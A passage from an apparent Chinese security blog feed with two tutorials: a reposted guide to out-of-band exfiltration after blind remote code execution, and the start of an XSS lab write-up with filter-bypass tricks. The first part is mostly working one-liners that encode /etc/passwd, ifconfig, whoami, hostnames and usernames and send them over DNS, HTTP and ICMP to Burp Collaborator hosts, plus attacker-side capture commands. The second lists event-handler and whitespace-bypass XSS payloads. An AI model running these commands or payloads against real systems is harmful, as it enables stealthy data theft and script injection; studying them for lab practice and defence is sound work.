src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/019.png"></p><h4 id="1-2-curl传输：curl也是一个利用思路，套路差不多，比较简单不再测试"><a href="#1-2-curl传输：curl也是一个利用思路，套路差不多，比较简单不再测试" class="headerlink" title="1.2 curl传输：curl也是一个利用思路，套路差不多，比较简单不再测试"></a><strong>1.2 curl传输：curl也是一个利用思路，套路差不多，比较简单不再测试</strong></h4><h3 id="2-DNS传输"><a href="#2-DNS传输" class="headerlink" title="2.DNS传输"></a><strong>2.DNS传输</strong></h3><h4 id="2-1通过base64编码传输"><a href="#2-1通过base64编码传输" class="headerlink" title="2.1通过base64编码传输"></a><strong>2.1通过base64编码传输</strong></h4><p><strong>base64编码传输</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">var=11111 &amp;&amp; for i in $(ifconfig|base64|awk &#x27;&#123;gsub(/.&#123;50&#125;/,&quot;&amp;\n&quot;)&#125;1&#x27;); do var=$((var+1)) &amp;&amp; nslookup $var.$i.402c35vpn9hpplp9ilj09pxx9ofe33.burpcollaborator.net; done<br></code></pre></td></tr></table></figure><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/020.png"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/021.png"></p><p><strong>每行记录，再base64解密</strong></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/022.png" alt="拿到机器ifconfig命令执行记录，部分会乱码"></p><p>拿到机器ifconfig命令执行记录，部分会乱码</p><h4 id="2-2-十六进制传输：（hex编码）"><a href="#2-2-十六进制传输：（hex编码）" class="headerlink" title="2.2 十六进制传输：（hex编码）"></a><strong>2.2 十六进制传输：（hex编码）</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">var=11111 &amp;&amp; for b in $(ifconfig|xxd -p ); do var=$((var+1)) &amp;&amp; dig $var.$b.itfjy788hafvu4q8xtf7naktrkxbpze.burpcollaborator.net; done<br></code></pre></td></tr></table></figure><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/023.png"></p><p>这种方式需要每条结果复制粘贴，比较麻烦，但回显结果还是准确的，可以看到ifconfig命令执行后的直接结果 </p><blockquote><p><strong>十六进制转换字符：</strong><a href="http://www.bejson.com/convert/ox2str">http://www.bejson.com/convert/ox2str</a></p></blockquote><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/024.png"></p><h4 id="2-3-ICMP传输"><a href="#2-3-ICMP传输" class="headerlink" title="2.3 ICMP传输"></a><strong>2.3 ICMP传输</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">linux<br>靶机<br>cat /etc/passwd | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 easn1l1elxy8t7azlztz02gkbbh65v.burpcollaborator.net;done<br>攻击者<br>sudo tcpdump &#x27;icmp and src host 202.14.120.xx&#x27; -w icmp_file.pcap#To capture<br>攻击者提取数据<br>echo &quot;0x$(tshark -n -q -r icmp_file.pcap -T fields -e data.data | tr -d &#x27;\n&#x27; | tr -d &#x27;:&#x27;)&quot; | xxd -r -p   #Or Use Wireshark gui<br></code></pre></td></tr></table></figure><hr><h2 id="Windows的应用"><a href="#Windows的应用" class="headerlink" title="Windows的应用"></a><strong>Windows的应用</strong></h2><h3 id="1-http传输-1"><a href="#1-http传输-1" class="headerlink" title="1.http传输"></a><strong>1.http传输</strong></h3><h4 id="1-1-curl传输"><a href="#1-1-curl传输" class="headerlink" title="1.1 curl传输"></a><strong>1.1 curl传输</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">windows中 %xxx% 的xxx代表系统变量,常用系统变量命令<br>              %SystemDrive%                                     系统安装的磁盘分区<br>              %SystemRoot% = %Windir% WINDODWS                  系统目录<br>              %ProgramFiles%　                                  应用程序默认安装目录<br>              %AppData%                                         应用程序数据目录<br>              %CommonProgramFiles%                              公用文件目录<br>              %HomePath%                                        当前活动用户目录<br>              %Temp% =%Tmp%                                     当前活动用户临时目录<br>              %DriveLetter%                                     逻辑驱动器分区<br>              %HomeDrive%                                       当前用户系统所在分区<br></code></pre></td></tr></table></figure><p><strong>curl抓取用户名：&#x2F;&#x2F;</strong>%USERNAME%，列出所有用户名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">curl http://0opr08yd8hhgror4veu9rp09j0pqdf.burpcollaborator.net/%USERNAME%<br></code></pre></td></tr></table></figure><p><strong>curl获取windows安装目录：</strong>&#x2F;&#x2F;%WinDir%，列出windows的安装目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">curl http://0opr08yd8hhgror4veu9rp09j0pqdf.burpcollaborator.net/%WinDir%<br></code></pre></td></tr></table></figure><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/025.png"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/026.png" alt="查看远程username名称结果为Butcher"></p><p>查看远程username名称结果为Butcher</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/027.png"></p><h4 id="1-2-certutil利用"><a href="#1-2-certutil利用" class="headerlink" title="1.2 certutil利用"></a><strong>1.2 certutil利用</strong></h4><p><strong>payload逻辑</strong></p><p>将ipconfig的结果记录在新建temp文件中，再对temp文件进行base64加密变成temp2文件，再对temp2文件中的多余字符”CERTIFICATE”删掉变成temp3，再对temp3的内容删除换行符生成所有数据只在一行的temp4（因为http响应包想要信息全部输出必须使信息全在一行），并把temp4的内容赋予变量为p1，最后使用curl爬取p1的值赋予http响应包的User-Agent字段输出于http:&#x2F;&#x2F; qysvrrmxvestl2c93ydg0u5p1g76vv.burpcollaborator.net中，最后删除本地文件夹中所有生成的带有temp字段的文件（也就是之前生成的temp~temp4四个文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">ipconfig &gt; temp &amp;&amp; certutil -f -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; (for /f %i in (./temp3) do set /p=%i&lt;nul &gt;&gt;temp4) || set /p pl=&lt;temp4 &amp;&amp; curl -H &quot;User-Agent:%pl%&quot; http://qysvrrmxvestl2c93ydg0u5p1g76vv.burpcollaborator.net &amp;&amp; del temp*<br></code></pre></td></tr></table></figure><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/028.png"></p><p><strong>执行成功</strong></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/029.png"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/030.png"></p><p><strong>Base64解码即可看到执行结果</strong></p><h3 id="2-DNS传输-1"><a href="#2-DNS传输-1" class="headerlink" title="2.DNS传输"></a><strong>2.DNS传输</strong></h3><h4 id="2-1-dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）"><a href="#2-1-dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）" class="headerlink" title="2.1 dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）"></a><strong>2.1 dns传输（单条传输，很鸡肋不推荐，只能执行hostname命令）</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">for /L %i in (1,1,10) do nslookup    //执行10次nslookup命令<br>cmd /v /c &quot;hostname &gt; temp &amp;&amp; certutil -f -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt;temp3 &amp;&amp; set FINAL=!MYVAR!.z00h57chzl8lln3fno9aydnspjv9jy.burpcollaborator.net &amp;&amp; nslookup !FINAL!&quot;<br></code></pre></td></tr></table></figure><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/031.png"></p><p>经过测试，回显只能执行hostname命令，没有办法通过写入对命令shell的循环来让其执行多次回显信息，失败。</p><h4 id="2-2-十六进制传输：（hex）–缺点：必须调用powershell"><a href="#2-2-十六进制传输：（hex）–缺点：必须调用powershell" class="headerlink" title="2.2 十六进制传输：（hex）–缺点：必须调用powershell"></a><strong>2.2 十六进制传输：（hex）–缺点：必须调用powershell</strong></h4><p><strong>payload逻辑：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">whoami &gt; test &amp;&amp; certutil -encodehex -f test test.hex 4 &amp;&amp; powershell $text=Get-Content test.hex;$sub=$text -replace(&#x27; &#x27;,&#x27;&#x27;);$j=11111;foreach($i in $sub)&#123; $fin=$j.tostring()+&#x27;.&#x27;+$i+&#x27;.qf95nhvxs08z5nr9wk19ruzsqjw9ky.burpcollaborator.net&#x27;;$j += 1; nslookup $fin &#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/032.png"></p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/033.png"></p><p>第二串字符</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/034.png"></p><p>两个拼接起来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">0a627574636865725c627574636865720d<br></code></pre></td></tr></table></figure><blockquote><p>十六进制转字符转换：<a href="http://www.bejson.com/convert/ox2str">http://www.bejson.com/convert/ox2str</a></p></blockquote><p>转后为信息是全的，可以全部一条条来，最后全部破解即可</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/035.png"></p><h4 id="2-3-通过win-r，直接输入-USERNAME-调用Burp地址来调用DNS解析记录"><a href="#2-3-通过win-r，直接输入-USERNAME-调用Burp地址来调用DNS解析记录" class="headerlink" title="2.3 通过win+r，直接输入%USERNAME%调用Burp地址来调用DNS解析记录"></a><strong>2.3 通过win+r，直接输入%USERNAME%调用Burp地址来调用DNS解析记录</strong></h4><p><strong>使用windows的win+r调出运行，再执行第二行代码，会调用DNS解析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">win+r<br>\\%USERNAME%.0opr08yd8hhgror4veu9rp09j0pqdf.burpcollaborator.net<br></code></pre></td></tr></table></figure><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/036.png"></p><h3 id="3-ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）"><a href="#3-ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）" class="headerlink" title="3.ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）"></a><strong>3.ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）</strong></h3><p>payload逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">whoami &gt; output.txt &amp;&amp; powershell $text=Get-Content output.txt;$ICMPClient = New-Object System.Net.NetworkInformation.Ping;$PingOptions = New-Object System.Net.NetworkInformation.PingOptions;$PingOptions.DontFragment = $True;$sendbytes = ([text.encoding]::ASCII).GetBytes($text);$ICMPClient.Send(&#x27; edvhr84xv7p1ga18aoiwl0mmzd54tt.burpcollaborator.net&#x27;,60 * 1000, $sendbytes, $PingOptions);<br></code></pre></td></tr></table></figure><p>原文链接：<a href="https://cloud.tencent.com/developer/article/1956480">带外攻击OOB（RCE无回显骚思路总结）</a></p>]]></content>
    
    
    <categories>
      
      <category>网安</category>
      
      <category>奇淫巧计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xss各种姿势的学习</title>
    <link href="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>靶场搭建</p><blockquote><p><a href="https://github.com/do0dl3/xss-labs">靶场下载地址：https://github.com/do0dl3/xss-labs</a></p></blockquote><p>搭建很简单，这里就不讲了。</p><blockquote><p>这里也可以像我一样直接用别人搭建好的公共靶场：<a href="https://xssaq.com/%E3%80%82%E8%BF%9B%E5%85%A5%E7%84%B6%E5%90%8E%E7%82%B9%E5%87%BB%60%E6%B8%B8%E6%88%8F%E6%8C%91%E6%88%98%60%E5%8D%B3%E5%8F%AF%E3%80%82%E4%B8%8D%E8%BF%87%E5%9B%A0%E4%B8%BA%E6%98%AF%E5%88%AB%E4%BA%BA%E6%90%AD%E8%BD%BD%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E6%9C%89%E5%8F%AF%E8%83%BD%E4%BC%9A%E6%9C%89%E5%8A%A0%E8%BD%BD%E8%BF%87%E6%85%A2%E7%AD%89%E7%AD%89%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%8C%E6%89%80%E4%BB%A5%E5%BB%BA%E8%AE%AE%E8%BF%98%E6%98%AF%E6%90%AD%E5%9C%A8%E6%9C%AC%E5%9C%B0%E7%BB%83%E4%B9%A0%E3%80%82">https://xssaq.com/。进入然后点击`游戏挑战`即可。不过因为是别人搭载的服务器，有可能会有加载过慢等等的问题，所以建议还是搭在本地练习。</a></p></blockquote><h1 id="个人重要总结"><a href="#个人重要总结" class="headerlink" title="个人重要总结"></a>个人重要总结</h1><h3 id="第一点：F12查看网络中的响应包、右键查看页面源代码和F12查看元素的区别"><a href="#第一点：F12查看网络中的响应包、右键查看页面源代码和F12查看元素的区别" class="headerlink" title="第一点：F12查看网络中的响应包、右键查看页面源代码和F12查看元素的区别"></a>第一点：F12查看网络中的响应包、右键查看页面源代码和F12查看元素的区别</h3><p>先来看F12查看网络中的响应包、右键查看页面源代码和F12查看元素的区别：</p><p>F12查看网络中的响应包：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/001-image.jpg"></p><p>右键查看页面源代码：</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/002-image.jpg"></p><p>上面这两个都是一样的，查看的都是最原始的页面源代码。其中能正确判断闭合是用<code>&#39;</code>单引号还是<code>&quot;</code>双引号，输出点有没有被实体编码等等；</p><p>F12查看元素：这种无法正确判断闭合是用<code>&#39;</code>单引号还是<code>&quot;</code>双引号，输出点有没有被实体编码</p><p><img src="/2024/10/31/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/xss%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84%E5%AD%A6%E4%B9%A0/003-image.jpg"></p><p>所以这里总结出来一点，就是xss的时候，先输入<code>&lt;a&gt;666&lt;/a&gt;</code>(用<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>来判断容易被发现)，然后优先看右键点击查看页面源代码，先判断闭合是要用<code>&#39;</code>单引号还是<code>&quot;</code>双引号，输出点有没有被实体编码等等，因为这个是最原始的页面源代码，也可以F12查看网络里的响应包，这两种是一样的；而F12查看元素是源代码 + 网页js渲染，有点不太一样，不是最原始的页面源代码。不过有时候这两个得结合在一起看。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">右键查看页面源代码或F12查看网络中的响应包：就是别人服务器发送到浏览器的原封不动的代码，也就是最原始的代码。<br><br>(F12)检查元素：看到的就是最终的html代码。即：源代码 + 网页js渲染 。<br><br>【注】在源代码中找不到的代码，是在浏览器执行js动态生成的。<br></code></pre></td></tr></table></figure><p>优先看右键点击查看页面源代码的原因：</p><p>这个是最原始的页面源代码。像level 3中value在F12中是<code>&quot;</code>双引号闭合，而右键查看却是<code>&#39;</code>单引号闭合，结果是<code>&#39;</code>单引号闭合最后能成功；还有被实体编码了也是右键查看才能看的出来。</p><p>根据这些种种原因，还是优先看右键点击查看源代码的页面源代码，先把上面这些判断清楚，然后次看F12查看元素。不过有时候这两个得结合在一起看。</p><h3 id="第二点：属性的属性值是否要加引号"><a href="#第二点：属性的属性值是否要加引号" class="headerlink" title="第二点：属性的属性值是否要加引号"></a>第二点：属性的属性值是否要加引号</h3><p>属性名，像事件属性，比如<code>onclick</code>,<code>onerror</code>这样的，它们后面的属性值的引号可加可不加。比如<code>onerror=alert(1)</code>和<code>onerror=&quot;alert(1)&quot;</code>都是可行的。不过如果没有把引号给过滤掉，能加最好还是要加。</p><p>而<code>src</code>属性的属性值要加引号，但是也不是必须的。像level 15关的<code>src</code>属性的属性值就必须要加引号才能成功；而像<code>&lt;ImG sRc=1 onerRor=alert(1);&gt;</code>这样在有的场合也能成功。所以一切还是要具体情况具体分析吧。</p><h3 id="第三点：属性的属性值要加引号的话，引号不能重复"><a href="#第三点：属性的属性值要加引号的话，引号不能重复" class="headerlink" title="第三点：属性的属性值要加引号的话，引号不能重复"></a>第三点：属性的属性值要加引号的话，引号不能重复</h3><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;x&quot; onerror=&quot;alert(&quot;1&quot;)&quot;;&gt;不行，<br>&lt;img src=&quot;x&quot; onerror=&#x27;alert(&quot;1&quot;)&#x27;;&gt;可以<br></code></pre></td></tr></table></figure><h3 id="第四点：单引号、双引号和反引号"><a href="#第四点：单引号、双引号和反引号" class="headerlink" title="第四点：单引号、双引号和反引号"></a>第四点：单引号、双引号和反引号</h3><p>如果是在html标签中，我们可以不用引号；如果是在javascript的函数中，我们可以用反引号代替单双引号。</p><p>举例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img src=&quot;1&quot; onerror=alert(1);&gt;可以，<br>&lt;img src=`1` onerror=alert(1);&gt;不行；<br><br>&lt;img src=&quot;1&quot; onerror=&#x27;alert(1)&#x27;;&gt;可以，<br>&lt;img src=&quot;1&quot; onerror=`alert(1)`;&gt;不行；<br><br>&lt;img src=&quot;x&quot; onerror=alert(&#x27;1&#x27;);&gt;可以，<br>&lt;img src=&quot;x&quot; onerror=alert(`1`);&gt;可以；<br></code></pre></td></tr></table></figure><h3 id="第五点：Javascript引擎特性和js代码中需要注意的点"><a href="#第五点：Javascript引擎特性和js代码中需要注意的点" class="headerlink" title="第五点：Javascript引擎特性和js代码中需要注意的点"></a>第五点：Javascript引擎特性和js代码中需要注意的点</h3><p>js代码中，利用<code>空格</code>，<code>回车</code>，<code>tab键</code>，切记只有<code>&quot;&quot;</code>包裹的js代码才可以随便利用<code>空格</code>，<code>回车</code>，<code>tab键</code>，比如<code>src=&quot;java script:xxxx&quot;</code>，而这样不行：<code>src=java script:xxxx</code>。而且<code>回车</code>、<code>换行</code>不支持在<code>on事件</code>中使用，<code>空格</code>可以</p><p>Javascript引擎特性：Javascript语句通常以分号结尾，但是如果引擎判断一条语句完整的话，且结尾有换行符，就可以省略分号。</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">var a = 1<br>var b = 2;<br>//上述语句都正确<br></code></pre></td></tr></table></figure><h1 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h1><p>这里总结了些绕过姿势，无论在实战还是靶场中的学习都能用上。也可以看看这两篇文章：<a href="https://blog.csdn.net/weixin_50464560/article/details/114491500">XSS过滤绕过速查表</a>，<a href="https://blog.csdn.net/weixin_50464560/article/details/119295255">XSS之绕过简单WAF总结</a></p><h2 id="尖括号被HTML实体编码的情况"><a href="#尖括号被HTML实体编码的情况" class="headerlink" title="尖括号被HTML实体编码的情况"></a>尖括号被HTML实体编码的情况</h2><h3 id="onmouseover事件-当鼠标指针移动到指定对象的时候触发js"><a href="#onmouseover事件-当鼠标指针移动到指定对象的时候触发js" class="headerlink" title="onmouseover事件-当鼠标指针移动到指定对象的时候触发js"></a>onmouseover事件-当鼠标指针移动到指定对象的时候触发js</h3><pre><code class="hljs">&#39;+οnmοuseοver=&#39;javascript:alert(1)</code></pre><h3 id="onblur事件-事件会在对象失去焦点时触发js"><a href="#onblur事件-事件会在对象失去焦点时触发js" class="headerlink" title="onblur事件-事件会在对象失去焦点时触发js"></a>onblur事件-事件会在对象失去焦点时触发js</h3><pre><code class="hljs">&#39;+onblur=javascript:alert(1)</code></pre><h3 id="onclick事件-当按钮被点击的时候触发js"><a href="#onclick事件-当按钮被点击的时候触发js" class="headerlink" title="onclick事件-当按钮被点击的时候触发js"></a>onclick事件-当按钮被点击的时候触发js</h3><pre><code class="hljs">&#39;+οnclick=&#39;alert(1)//&#39;+onclick=&#39;javascript:alert(2)</code></pre><h3 id="onfocus事件-当鼠标点击输入框且输入框被选中可以输入内容的时候触发js"><a href="#onfocus事件-当鼠标点击输入框且输入框被选中可以输入内容的时候触发js" class="headerlink" title="onfocus事件-当鼠标点击输入框且输入框被选中可以输入内容的时候触发js"></a>onfocus事件-当鼠标点击输入框且输入框被选中可以输入内容的时候触发js</h3><pre><code class="hljs">&#39;+οnfocus=&#39;alert(1)&#39;+onfocus=&#39;javascript:alert(2)</code></pre><p>。。。</p><p>更多可以参考：<a href="https://www.runoob.com/jsref/dom-obj-event.html">菜鸟教程-HTML DOM 事件</a></p><h2 id="空格被过滤的情况"><a href="#空格被过滤的情况" class="headerlink" title="空格被过滤的情况"></a>空格被过滤的情况</h2><hr><h3 id="用-代替空格"><a href="#用-代替空格" class="headerlink" title="用/代替空格"></a>用<code>/</code>代替空格</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img/src=&quot;1&quot;/onerror=alert(1);&gt;<br></code></pre></td></tr></table></figure><h3 id="用回车符CR-0d-和换行符LF-0a-取代空格"><a href="#用回车符CR-0d-和换行符LF-0a-取代空格" class="headerlink" title="用回车符CR(%0d) 和换行符LF(%0a)取代空格"></a>用回车符CR(%0d) 和换行符LF(%0a)取代空格</h3><p>在HTML中<code>%0a</code>和<code>%0d</code>是可以当成空格使用的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text-plain">&lt;img%0asrc=&#x27;1&#x27;%0donerror=alert(1);&gt;<br></code></pre></td></tr></table></figure><h2 id="关键字被过滤的情况"><a href="#关键字被过滤的情况" 